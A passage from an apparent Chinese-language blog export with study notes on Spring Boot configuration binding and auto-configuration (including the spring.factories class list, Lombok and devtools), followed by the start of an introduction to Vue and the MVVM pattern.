class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrice</span><span class="params">(Integer price)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Car&#123;"</span> +</span><br><span class="line">                <span class="string">"brand='"</span> + brand + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", price="</span> + price +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="EnableConfigurationProperties-ConfigurationProperties"><a href="#EnableConfigurationProperties-ConfigurationProperties" class="headerlink" title="@EnableConfigurationProperties + @ConfigurationProperties"></a>@EnableConfigurationProperties + @ConfigurationProperties</h4><h4 id="Component-ConfigurationProperties"><a href="#Component-ConfigurationProperties" class="headerlink" title="@Component + @ConfigurationProperties"></a>@Component + @ConfigurationProperties</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">@EnableConfigurationProperties(Car.<span class="keyword">class</span>)</span><br><span class="line">//<span class="symbol">1</span>、开启<span class="symbol">Car</span>配置绑定功能</span><br><span class="line">//<span class="symbol">2</span>、把这个<span class="symbol">Car</span>这个组件自动注册到容器中</span><br><span class="line"><span class="symbol">public</span> <span class="symbol">class</span> <span class="symbol">MyConfig</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="自动配置原理入门"><a href="#自动配置原理入门" class="headerlink" title="自动配置原理入门"></a>自动配置原理入门</h2><h3 id="引导加载自动配置类"><a href="#引导加载自动配置类" class="headerlink" title="引导加载自动配置类"></a>引导加载自动配置类</h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="variable">@SpringBootConfiguration</span></span><br><span class="line"><span class="variable">@EnableAutoConfiguration</span></span><br><span class="line"><span class="variable">@ComponentScan</span>(excludeFilters = &#123; <span class="variable">@Filter</span>(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class),</span><br><span class="line">        <span class="variable">@Filter</span>(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) &#125;)</span><br><span class="line">public <span class="variable">@interface</span> SpringBootApplication&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================</span><br></pre></td></tr></table></figure>
<h4 id="SpringBootConfiguration"><a href="#SpringBootConfiguration" class="headerlink" title="@SpringBootConfiguration"></a>@SpringBootConfiguration</h4><p>@Configuration。代表当前是一个配置类</p>
<h4 id="ComponentScan"><a href="#ComponentScan" class="headerlink" title="@ComponentScan"></a>@ComponentScan</h4><p>指定扫描哪些，Spring注解；</p>
<h4 id="EnableAutoConfiguration"><a href="#EnableAutoConfiguration" class="headerlink" title="@EnableAutoConfiguration"></a>@EnableAutoConfiguration</h4><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="variable">@AutoConfigurationPackage</span></span><br><span class="line"><span class="variable">@Import</span>(AutoConfigurationImportSelector.class)</span><br><span class="line">public <span class="variable">@interface</span> EnableAutoConfiguration &#123;&#125;</span><br></pre></td></tr></table></figure>
<h5 id="AutoConfigurationPackage"><a href="#AutoConfigurationPackage" class="headerlink" title="@AutoConfigurationPackage"></a>@AutoConfigurationPackage</h5><p>自动配置包？指定了默认的包规则</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@Import</span>(AutoConfigurationPackages.Registrar.class)  <span class="comment">//给容器中导入一个组件</span></span><br><span class="line">public <span class="variable">@interface</span> AutoConfigurationPackage &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用Registrar给容器中导入一系列组件</span></span><br><span class="line"><span class="comment">//将指定的一个包下的所有组件导入进来？MainApplication 所在包下。</span></span><br></pre></td></tr></table></figure>
<h5 id="Import-AutoConfigurationImportSelector-class"><a href="#Import-AutoConfigurationImportSelector-class" class="headerlink" title="@Import(AutoConfigurationImportSelector.class)"></a>@Import(AutoConfigurationImportSelector.class)</h5><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、利用get<span class="constructor">AutoConfigurationEntry(<span class="params">annotationMetadata</span>)</span>;给容器中批量导入一些组件</span><br><span class="line"><span class="number">2</span>、调用List&lt;String&gt; configurations = get<span class="constructor">CandidateConfigurations(<span class="params">annotationMetadata</span>, <span class="params">attributes</span>)</span>获取到所有需要导入到容器中的配置类</span><br><span class="line"><span class="number">3</span>、利用工厂加载 Map&lt;String, List&lt;String&gt;&gt; load<span class="constructor">SpringFactories(@Nullable ClassLoader <span class="params">classLoader</span>)</span>；得到所有的组件</span><br><span class="line"><span class="number">4</span>、从META-INF/spring.factories位置来加载一个文件。</span><br><span class="line">    默认扫描我们当前系统里面所有META-INF/spring.factories位置的文件</span><br><span class="line">    spring-boot-autoconfigure-<span class="number">2.3</span>.<span class="number">4.</span><span class="module-access"><span class="module"><span class="identifier">RELEASE</span>.</span></span>jar包里面也有META-INF/spring.factories</span><br></pre></td></tr></table></figure>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">文件里面写死了spring-<span class="keyword">boot</span>一启动就要给容器中加载的所有配置类</span><br><span class="line">spring-<span class="keyword">boot</span>-autoconfigure-2.3.4.RELEASE.jar/<span class="keyword">META</span>-<span class="keyword">INF</span>/spring.factories</span><br><span class="line"># Auto Configure</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.EnableAutoConfiguration=\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.aop.AopAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.amqp.RabbitAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.batch.BatchAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.cache.CacheAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.cassandra.CassandraAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.context.ConfigurationPropertiesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.context.LifecycleAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.context.MessageSourceAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.context.PropertyPlaceholderAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.couchbase.CouchbaseAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.cassandra.CassandraDataAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.cassandra.CassandraReactiveDataAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.cassandra.CassandraReactiveRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.cassandra.CassandraRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.couchbase.CouchbaseDataAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.couchbase.CouchbaseReactiveDataAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.couchbase.CouchbaseReactiveRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.couchbase.CouchbaseRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.elasticsearch.ElasticsearchDataAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.elasticsearch.ElasticsearchRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.elasticsearch.ReactiveElasticsearchRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.elasticsearch.ReactiveElasticsearchRestClientAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.jdbc.JdbcRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.ldap.LdapRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.mongo.MongoDataAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.mongo.MongoReactiveDataAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.mongo.MongoReactiveRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.mongo.MongoRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.neo4j.Neo4jDataAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.neo4j.Neo4jRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.solr.SolrRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.r2dbc.R2dbcDataAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.r2dbc.R2dbcRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.r2dbc.R2dbcTransactionManagerAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.redis.RedisAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.redis.RedisReactiveAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.rest.RepositoryRestMvcAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.data.web.SpringDataWebAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.elasticsearch.ElasticsearchRestClientAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.flyway.FlywayAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.freemarker.FreeMarkerAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.groovy.template.GroovyTemplateAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.gson.GsonAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.h2.H2ConsoleAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.hateoas.HypermediaAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.hazelcast.HazelcastAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.hazelcast.HazelcastJpaDependencyAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.http.HttpMessageConvertersAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.http.codec.CodecsAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.influx.InfluxDbAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.info.ProjectInfoAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.integration.IntegrationAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jackson.JacksonAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jdbc.DataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jdbc.JdbcTemplateAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jdbc.JndiDataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jdbc.XADataSourceAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jms.JmsAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jmx.JmxAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jms.JndiConnectionFactoryAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jms.activemq.ActiveMQAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jms.artemis.ArtemisAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jersey.JerseyAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jooq.JooqAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.jsonb.JsonbAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.kafka.KafkaAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.availability.ApplicationAvailabilityAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.ldap.embedded.EmbeddedLdapAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.ldap.LdapAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.liquibase.LiquibaseAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.mail.MailSenderAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.mail.MailSenderValidatorAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.mongo.MongoAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.mongo.MongoReactiveAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.mustache.MustacheAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.quartz.QuartzAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.r2dbc.R2dbcAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.rsocket.RSocketMessagingAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.rsocket.RSocketRequesterAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.rsocket.RSocketServerAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.rsocket.RSocketStrategiesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.security.servlet.SecurityAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.security.servlet.UserDetailsServiceAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.security.servlet.SecurityFilterAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.security.reactive.ReactiveSecurityAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.security.reactive.ReactiveUserDetailsServiceAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.security.rsocket.RSocketSecurityAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.security.saml2.Saml2RelyingPartyAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.sendgrid.SendGridAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.session.SessionAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.security.oauth2.client.servlet.OAuth2ClientAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.security.oauth2.client.reactive.ReactiveOAuth2ClientAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.security.oauth2.resource.servlet.OAuth2ResourceServerAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.security.oauth2.resource.reactive.ReactiveOAuth2ResourceServerAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.solr.SolrAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.task.TaskExecutionAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.task.TaskSchedulingAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.thymeleaf.ThymeleafAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.transaction.TransactionAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.transaction.jta.JtaAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.validation.ValidationAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.client.RestTemplateAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.reactive.HttpHandlerAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.reactive.ReactiveWebServerFactoryAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.reactive.WebFluxAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.reactive.<span class="keyword">error</span>.ErrorWebFluxAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.reactive.function.client.ClientHttpConnectorAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.reactive.function.client.WebClientAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.servlet.DispatcherServletAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.servlet.ServletWebServerFactoryAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.servlet.<span class="keyword">error</span>.ErrorMvcAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.servlet.HttpEncodingAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.servlet.MultipartAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.web.servlet.WebMvcAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.websocket.reactive.WebSocketReactiveAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.websocket.servlet.WebSocketServletAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.websocket.servlet.WebSocketMessagingAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.webservices.WebServicesAutoConfiguration,\</span><br><span class="line">org.springframework.<span class="keyword">boot</span>.autoconfigure.webservices.client.WebServiceTemplateAutoConfiguration</span><br></pre></td></tr></table></figure>
<h3 id="按需开启自动配置项"><a href="#按需开启自动配置项" class="headerlink" title="按需开启自动配置项"></a>按需开启自动配置项</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">虽然我们<span class="number">127</span>个场景的所有自动配置启动的时候默认全部加载。xxxxAutoConfiguration</span><br><span class="line">按照条件装配规则（@Conditional），最终会按需配置。</span><br></pre></td></tr></table></figure>
<h3 id="修改默认配置"><a href="#修改默认配置" class="headerlink" title="修改默认配置"></a>修改默认配置</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="meta">@Bean</span></span><br><span class="line">        <span class="meta">@ConditionalOnBean</span>(MultipartResolver<span class="class">.<span class="keyword">class</span>)  //容器中有这个类型组件</span></span><br><span class="line"><span class="class">        @<span class="title">ConditionalOnMissingBean</span>(<span class="title">name</span> </span>= DispatcherServlet.MULTIPART_RESOLVER_BEAN_NAME) <span class="comment">//容器中没有这个名字 multipartResolver 的组件</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> MultipartResolver <span class="title">multipartResolver</span><span class="params">(MultipartResolver resolver)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//给@Bean标注的方法传入了对象参数，这个参数的值就会从容器中找。</span></span><br><span class="line">            <span class="comment">//SpringMVC multipartResolver。防止有些用户配置的文件上传解析器不符合规范</span></span><br><span class="line">            <span class="comment">// Detect if the user has created a MultipartResolver but named it incorrectly</span></span><br><span class="line">            <span class="keyword">return</span> resolver;</span><br><span class="line">        &#125;</span><br><span class="line">给容器中加入了文件上传解析器；</span><br></pre></td></tr></table></figure>
<p>SpringBoot默认会在底层配好所有的组件。但是如果用户自己配置了以用户的优先</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CharacterEncodingFilter <span class="title">characterEncodingFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>总结：</p>
<ul>
<li>SpringBoot先加载所有的自动配置类  xxxxxAutoConfiguration</li>
<li>每个自动配置类按照条件进行生效，默认都会绑定配置文件指定的值。xxxxProperties里面拿。xxxProperties和配置文件进行了绑定</li>
<li>生效的配置类就会给容器中装配很多组件</li>
<li>只要容器中有这些组件，相当于这些功能就有了</li>
<li><p>定制化配置</p>
</li>
<li><ul>
<li>用户直接自己@Bean替换底层的组件</li>
<li>用户去看这个组件是获取的配置文件什么值就去修改。</li>
</ul>
</li>
</ul>
<p><strong>xxxxxAutoConfiguration —-&gt; 组件  —-&gt;</strong> <strong>xxxxProperties里面拿值  ——&gt; application.properties</strong></p>
<h2 id="开发小技巧"><a href="#开发小技巧" class="headerlink" title="开发小技巧"></a>开发小技巧</h2><h3 id="Lombok"><a href="#Lombok" class="headerlink" title="Lombok"></a>Lombok</h3><p>简化JavaBean开发</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">idea中搜索安装lombok插件</span><br><span class="line">===============================简化JavaBean开发===================================</span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="comment">//@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="meta">@EqualsAndHashCode</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Pet pet;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User(String name,Integer age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">================================简化日志开发===================================</span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(<span class="meta-string">"/hello"</span>)</span></span><br><span class="line">    <span class="keyword">public</span> String handle01(<span class="meta">@RequestParam(<span class="meta-string">"name"</span>)</span> String name)&#123;</span><br><span class="line">        </span><br><span class="line">        log.info(<span class="string">"请求进来了...."</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello, Spring Boot 2!"</span>+<span class="string">"你好："</span>+name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="dev-tools"><a href="#dev-tools" class="headerlink" title="dev-tools"></a>dev-tools</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>项目或者页面修改以后：Ctrl+F9；</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue快速入门</title>
    <url>/2021/04/25/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><h2 id="第一个Vue程序"><a href="#第一个Vue程序" class="headerlink" title="第一个Vue程序"></a>第一个Vue程序</h2><h3 id="什么是MVVM"><a href="#什么是MVVM" class="headerlink" title="什么是MVVM"></a>什么是MVVM</h3><p>MVVM（Model-View-ViewModel）是一种软件设计模式，由微软WPF（用于替代WinForm，以前就是用这个技术开发桌面应用程序的）和Silverlight（类似于Java Applet，简单点说就是在浏览器上运行WPF）的架构师Ken Cooper和Ted Peters开发，是一种简化用户界面的事件驱动编程方式。由John Gossman（同样也是WPF和Sliverlight的架构师）与2005年在他的博客上发表。</p>
<p>MVVM源自于经典的MVC（Model-View-Controller）模式。MVVM的核心是ViewModel层，负责转换Model中的数据对象来让数据变得更容易管理和使用。其作用如下：</p>
<p>该层向上与视图层进行双向数据绑定<br>向下与Model层通过接口请求进行数据交互</p>
<p>MVVM已经相当成熟了，主要运用但不仅仅在网络应用程序开发中。当下流行的MVVM框架有<code>Vue.js</code>，<code>Anfular JS</code></p>
<h3 id="为什么要使用MVVM"><a href="#为什么要使用MVVM" class="headerlink" title="为什么要使用MVVM"></a>为什么要使用MVVM</h3><p>MVVM模式和MVC模式一样，主要目的是分离视图（View）和模型（Model），有几大好处</p>
<ul>
<li><p>低耦合：视图（View）可以独立于Model变化和修改，一个ViewModel可以绑定到不同的View上，当View变化的时候Model可以不变，当Model变化的时候View也可以不变。</p>
</li>
<li><p>可复用：你可以把一些视图逻辑放在一个ViewModel里面，让很多View重用这段视图逻辑。</p>
</li>
<li><p>独立开发：开发人员可以专注于业务逻辑和数据的开发（ViewMode），设计人员可以专注于页面设计。</p>
</li>
<li><p>可测试：界面素来是比较难以测试的，而现在测试可以针对ViewModel来写。</p>
</li>
</ul>
<ol>
<li><p>View</p>
<p> View是视图层， 也就是用户界面。前端主要由HTH L和csS来构建， 为了更方便地展现vi eu to del或者Hodel层的数据， 已经产生了各种各样的前后端模板语言， 比如FreeMarker，Thyme leaf等等， 各大MV VM框架如Vue.js.Angular JS， EJS等也都有自己用来构建用户界面的内置模板语言。</p>
</li>
<li><p>Model</p>
<p> Model是指数据模型， 泛指后端进行的各种业务逻辑处理和数据操控， 主要围绕数据库系统展开。这里的难点主要在于需要和前端约定统一的接口规则</p>
</li>
<li><p>ViewModel</p>
